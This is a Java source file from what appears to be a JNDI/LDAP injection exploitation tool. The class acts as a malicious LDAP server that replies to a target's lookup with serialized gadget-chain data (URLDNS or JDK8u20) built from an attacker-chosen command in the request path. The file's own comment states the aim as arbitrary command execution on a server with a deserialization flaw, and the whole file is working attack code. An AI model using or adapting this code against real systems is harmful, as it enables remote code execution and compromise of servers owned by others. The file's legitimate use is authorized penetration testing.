package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.enums.PayloadEnum;
import net.roboterh.injector.enums.PayloadGadgetEnum;
import net.roboterh.injector.gadgetpayloads.JDK8u20;
import net.roboterh.injector.gadgetpayloads.URLDNS;
import net.roboterh.injector.utils.PayloadUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

import java.util.Arrays;

/*
    Deserialization Way:
    Requirement:
        There is a deserialization vulnerability in the remote server
    Explanation:
        Set the attribute `javaSerializedData` to serialized data, and the data will be deserialized.
        As a result, we can execute arbitrary command.
 */
public class Deserialization implements LDAPService{
    private static final Logger logger = LogManager.getLogger(Deserialization.class);

    private PayloadGadgetEnum payloadGadget;
    private PayloadEnum payload;
    private String[] params;
    private byte[] bytes;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            Entry entry = new Entry(baseDN);
            logger.info(String.format("Send LDAP result for %s using Deserialization Way ...", baseDN));
            entry.addAttribute("javaClassName", "foo");
            entry.addAttribute("javaSerializedData", bytes);
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        try {
            int firstIndex = baseDN.indexOf("/");
            int secondIndex = baseDN.indexOf("/", firstIndex + 1);

            // obtain the value of PayloadGadget
            payloadGadget = PayloadGadgetEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));

            // no payload
            if (payloadGadget == PayloadGadgetEnum.URLDNS) {
                String domain = "http://" + baseDN.substring(baseDN.lastIndexOf("/") + 1);
                params = new String[]{domain};
            }

            // have payload
            int thirdIndex = baseDN.indexOf("/", secondIndex + 1);
            if (thirdIndex < 0) {
                // without the third index
                thirdIndex = baseDN.length();
            }
            payload = PayloadEnum.valueOf(baseDN.substring(secondIndex + 1, thirdIndex));
            // add params
            switch (payload.name()) {
                case "DnsLog":
                    String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
                    params = new String[]{link};
                    break;
                case "Command":
                    String cmd = PayloadUtils.getCmdFromBase(baseDN);
                    params = new String[]{cmd};
                    break;
            }

            // print the log
            logger.info(String.format("Received PayloadGadget is %s , Payload is %s and Params are %s...", payloadGadget, payload, Arrays.toString(params)));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void generateHandler() {
        try {
            switch (payloadGadget.name()) {
                case "URLDNS":
                    bytes = URLDNS.getBytes(params[0]);
                    break;
                case "JDK8u20":
                    bytes = JDK8u20.getBytes(payload, params);
                    break;
            }
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }
}
